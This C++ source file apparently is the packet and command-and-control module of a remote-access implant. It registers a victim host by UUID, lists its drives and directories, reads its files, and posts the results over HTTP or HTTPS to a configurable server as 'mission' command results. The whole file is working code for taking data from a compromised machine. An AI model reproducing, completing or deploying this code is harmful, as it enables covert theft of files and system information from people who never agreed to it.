
#include <vector>

#include "packet.h"

#include "public.h"
#include "FileHelper.h"
#include <shlwapi.h>
#include "command.h"

#include "file.h"
#include "mission.h"
#include "utils.h"
#include "api.h"

PacketParcel::PacketParcel() {

}

PacketParcel::~PacketParcel() {
	if (m_protocol)
	{
		delete m_protocol;
		m_protocol = 0;
	}
}


PacketParcel::PacketParcel(int bPost) {
	if (g_httpsToggle)
	{
		m_protocol = new HttpsProto(bPost);
	}
	else {
		HttpProto* http = new HttpProto(bPost);
		m_protocol = (HttpsProto*)http;
	}
}

PacketParcel::PacketParcel(int bPost, string userid) :PacketParcel(bPost) {

	m_userid = userid;
}


PacketParcel::PacketParcel(wchar_t* ip, unsigned short port, wchar_t* app)
{
	if (g_httpsToggle)
	{
		m_protocol = new HttpsProto(ip, port, app);
	}
	else {
		HttpProto* http = new HttpProto(ip, port, app);
		m_protocol = (HttpsProto*)http;
	}
}


int PacketParcel::online(char ** data,int * datasize) {

	int ret = 0;
	int size = 0;
	ret= cmdWrapper(0, 0, CMD_ONLINE,data,datasize);
	return ret;
}


int PacketParcel::driveWrapper(char* subdata, int subsize, char** data,int* datasize) {
	int ret = 0;
	if (data == 0)
	{
		return FALSE;
	}

	char drivers[128];
	int drivers_len = getDrivers(drivers, sizeof(drivers));

	if (*data == 0) {
		*data = new char[drivers_len + sizeof(PACKET_HEADER) + sizeof(DATA_PACK_TAG) + sizeof(MY_CMD_PACKET) + 16];
	}

	PACKET_HEADER* hdr = (PACKET_HEADER*)(*data);
	hdr->tag = DATA_PACK_TAG;
	memcpy(hdr->hdr.cmd, CMD_PUT_COMMAND_RESULT, sizeof(hdr->hdr.cmd));

	int uuid_len = g_uuid_len;
	hdr->hdr.hostname_len = uuid_len;
	memcpy(hdr->hdr.hostname, g_uuid, uuid_len);

	hdr->hdr.hostname2_len = subsize;
	memcpy((char*)hdr->hdr.hostname2, subdata, subsize);

	int offset = sizeof(PACKET_HEADER);

	MY_CMD_PACKET* inpack = (MY_CMD_PACKET*)(*data + offset);
	inpack->type = MISSION_TYPE_DRIVE;
	inpack->len = drivers_len;
	offset += sizeof(MY_CMD_PACKET);
	memcpy(inpack->value, drivers, drivers_len);

	offset += drivers_len;

	*(DWORD*)(*data + offset) = DATA_PACK_TAG;
	offset += sizeof(DATA_PACK_TAG);

	*datasize = offset;

	runLog("driveWrapper size:%d\r\n", drivers_len);

	return offset;
}


int PacketParcel::dirWrapper(const char* path, char* subdata, int subsize, char** data, int* datasize) {
	int ret = 0;
	if (data == 0)
	{
		return FALSE;
	}

	vector<FILE_INFOMATION> files = listDir(path);
	if (files.size() == 0)
	{
		//return FALSE;
	}
	int bufsize = files.size() * (sizeof(FILE_INFOMATION));

	if (*data == 0) {
		*data = new char[bufsize + sizeof(PACKET_HEADER) + sizeof(DATA_PACK_TAG)+ sizeof(MY_CMD_PACKET) + sizeof(int) + 16];
	}

	PACKET_HEADER* hdr = (PACKET_HEADER*)(*data);
	hdr->tag = DATA_PACK_TAG;
	memcpy(hdr->hdr.cmd, CMD_PUT_COMMAND_RESULT, sizeof(hdr->hdr.cmd));

	int uuid_len = g_uuid_len;
	hdr->hdr.hostname_len = uuid_len;
	memcpy(hdr->hdr.hostname, g_uuid, uuid_len);

	hdr->hdr.hostname2_len = subsize;
	memcpy((char*)hdr->hdr.hostname2, subdata, subsize);

	int offset = sizeof(PACKET_HEADER);

	MY_CMD_PACKET* inpack = (MY_CMD_PACKET*)(*data + offset);
	inpack->type = MISSION_TYPE_DIR;
	inpack->len = files.size();
	offset += sizeof(MY_CMD_PACKET);

	char* bufptr = *data + offset;
	char* base = bufptr;
	*(int*)bufptr = files.size();
	bufptr += sizeof(int);
	for (int i = 0; i < files.size(); i++)
	{
		memcpy(bufptr, &files[i], sizeof(FILE_INFOMATION));

		FILE_INFOMATION* fi = (FILE_INFOMATION*)bufptr;
		bufptr = bufptr + sizeof(FILE_INFOMATION) - MAX_PATH + fi->fnlen;
	}

	int blocksize = bufptr - base;

	offset += blocksize;

	*(DWORD*)(*data + offset) = DATA_PACK_TAG;
	offset += sizeof(DATA_PACK_TAG);

	*datasize = offset;

	return offset;
}


int PacketParcel::fileWrapper(const char* filename, char * subdata,int subsize,char** data, int* datasize) {
	int ret = 0;
	if (data == 0)
	{
		return FALSE;
	}
	int b_file_data = 0;
	DWORD sizehigh = 0;
	int filesize = 0;
	HANDLE hf = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0, 
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hf == INVALID_HANDLE_VALUE)
	{
		ret = GetLastError();
		//return FALSE;
	}
	else {
		filesize = GetFileSize(hf, &sizehigh);
		if (sizehigh || filesize >= g_fsize_limit)
		{
			filesize = 0;
		}
		else {
			b_file_data = TRUE;
		}
	}

	if (*data == 0) {
		*data = new char[filesize + sizeof(PACKET_HEADER) + 1024];
	}

	PACKET_HEADER* hdr = (PACKET_HEADER*)(*data);
	hdr->tag = DATA_PACK_TAG;
	memcpy(hdr->hdr.cmd, CMD_PUT_COMMAND_RESULT, sizeof(hdr->hdr.cmd));

	int uuid_len = g_uuid_len;
	hdr->hdr.hostname_len = uuid_len;
	memcpy(hdr->hdr.hostname, g_uuid, uuid_len);

	hdr->hdr.hostname2_len = subsize;
	memcpy((char*)hdr->hdr.hostname2, subdata, subsize);

	int offset = sizeof(PACKET_HEADER);

	MY_CMD_PACKET* inpack = (MY_CMD_PACKET*)(*data + offset);
	inpack->type = MISSION_TYPE_FILE;
	inpack->len = filesize;
	offset += sizeof(MY_CMD_PACKET);

	if (b_file_data)
	{
		DWORD cnt = 0;
		ret = lpReadFile(hf, *data + offset, filesize, &cnt, 0);
		if (ret == 0)
		{

		}
		CloseHandle(hf);

		offset += filesize;
	}

	*(DWORD*)(*data + offset) = DATA_PACK_TAG;
	offset += sizeof(DATA_PACK_TAG);

	*datasize = offset;

	return offset;
}



int PacketParcel::cmdWrapper(char * data,int size,const char * cmd,char **out,int * outisize) {
	if (out == 0 )
	{
		return FALSE;
	}	

	if (*out == 0)
	{
		int bufsize = sizeof(int) + size + sizeof(PACKET_HEADER) + sizeof(DATA_PACK_TAG);
		*out = new char[bufsize];
	}
	PACKET_HEADER* hdr = (PACKET_HEADER*)(*out);
	memset(hdr, 0, sizeof(PACKET_HEADER));
	hdr->tag = DATA_PACK_TAG;
	memcpy(hdr->hdr.cmd, cmd, sizeof(hdr->hdr.cmd));

	hdr->hdr.hostname_len = g_uuid_len;
	memcpy(hdr->hdr.hostname, g_uuid, g_uuid_len);

	int offset = sizeof(PACKET_HEADER);
	if (cmd == CMD_ONLINE)
	{
		offset = offset - g_uuid_len - 1;
	}

	if (data && size)
	{
		memcpy(*out + offset, data, size);
		offset += size;
	}

	*(DWORD*)(*out + offset) = DATA_PACK_TAG;
	offset += sizeof(DATA_PACK_TAG);

	*outisize = offset;
	
	return TRUE;
}


int PacketParcel::cmdWrapper(const char* cmd, const char * subcmd,char** out, int* outisize) {
	if (out == 0)
	{
		return FALSE;
	}

	if (*out == 0)
	{
		int bufsize =  sizeof(ALLHOSTS_HEADER) + sizeof(DATA_PACK_TAG);
		*out = new char[bufsize];
	}
	ALLHOSTS_HEADER* hdr = (ALLHOSTS_HEADER*)(*out);
	hdr->tag = DATA_PACK_TAG;
	hdr->tagEnd = DATA_PACK_TAG;
	memcpy(hdr->cmd, cmd, sizeof(hdr->cmd));
	memcpy(hdr->subcmd, subcmd, sizeof(hdr->subcmd));

	int offset = sizeof(ALLHOSTS_HEADER);

	*outisize = offset;

	return TRUE;
}




int PacketParcel::cmdDataWrapper(char* data, int size, const char* cmd, const char* subdata,int subsize, char** out, int* outisize) {
	if (out == 0)
	{
		return FALSE;
	}

	if (*out == 0)
	{
		int bufsize = size + sizeof(PACKET_HEADER) + sizeof(DATA_PACK_TAG) + subsize;
		*out = new char[bufsize];
	}
	PACKET_HEADER* pack = (PACKET_HEADER*)(*out);
	pack->tag = DATA_PACK_TAG;

	memcpy(pack->hdr.cmd, cmd, sizeof(pack->hdr.cmd));

	int uuid_len = g_uuid_len;
	pack->hdr.hostname_len = uuid_len;
	memcpy(pack->hdr.hostname, g_uuid, uuid_len);

	pack->hdr.hostname2_len = subsize;
	memcpy((char*)pack->hdr.hostname2, subdata,subsize);

	int offset = sizeof(PACKET_HEADER) + subsize;

	if (data && size)
	{
		memcpy(*out + offset, data, size);
		offset += size;
	}

	*(DWORD*)(*out + offset) = DATA_PACK_TAG;
	offset += sizeof(DATA_PACK_TAG);

	*outisize = offset;

	return TRUE;
}




bool PacketParcel::postCmd(const char* cmd, char* data, int datasize) {

	int ret = 0;

	char* pack = 0;
	int packsize = 0;

	ret = cmdWrapper(data, datasize, cmd, &pack, &packsize);
	if (ret)
	{
		ret = m_protocol->httpRequest(pack, packsize);
	}

	if (pack)
	{
		delete[] pack;
	}

	m_data = m_protocol->m_resp;
	m_datalen = m_protocol->m_respLen;
	return ret;
}



bool PacketParcel::postAllCmd(const char* cmd, const char* subcmd) {

	char* data = 0;
	int datasize = 0;
	int ret = 0;

	ret = cmdWrapper( cmd, subcmd, &data, &datasize);
	if (ret)
	{
		ret = m_protocol->httpRequest(data, datasize);
	}

	if (data)
	{
		delete data;
	}

	m_data = m_protocol->m_resp;
	m_datalen = m_protocol->m_respLen;

	return ret;
}



bool PacketParcel::postCmdFile(const char* cmd, const char* data, int datasize) {

	char* packet = 0;
	int packsize = 0;
	int ret = 0;

	ret = cmdDataWrapper((char*)data, datasize, cmd, FILE_CMD_FILENAME, lstrlenA(FILE_CMD_FILENAME), &packet, &packsize);
	if (ret)
	{
		ret = m_protocol->httpRequest(packet, packsize);
	}

	if (packet)
	{
		delete packet;
	}

	m_data = m_protocol->m_resp;
	m_datalen = m_protocol->m_respLen;

	return ret;
}



bool PacketParcel::postFile(string filename,int type,char * subdata,int subsize) {

	char* data = 0;
	int datasize = 0;
	int ret = 0;

	if (type == MISSION_TYPE_DRIVE)
	{
		ret = driveWrapper( subdata, subsize, &data, &datasize);
	}
	else {
		ret = PathIsDirectoryA(filename.c_str());
		if ((ret & FILE_ATTRIBUTE_DIRECTORY))
		{
			ret = dirWrapper(filename.c_str(), subdata, subsize, &data, &datasize);
		}
		else if ((ret & FILE_ATTRIBUTE_ARCHIVE))
		{
			ret = fileWrapper(filename.c_str(), subdata, subsize, &data, &datasize);
		}
		else {
			ret = fileWrapper(filename.c_str(), subdata, subsize, &data, &datasize);
		}
	}

	if (ret)
	{
		ret = m_protocol->httpRequest(data, datasize);
	}

	if (data)
	{
		delete data;
	}

	m_data = m_protocol->m_resp;
	m_datalen = m_protocol->m_respLen;

	return ret;
}


char* PacketParcel::getbuf() {
	return m_protocol->m_resp;
}

int PacketParcel::getbufsize() {
	return m_protocol->m_respLen;
}


HttpsProto* PacketParcel::getProtocol() {
	return m_protocol;
}

int PacketParcel::setUserID(string userid) {
	m_userid = userid;
	return 0;
}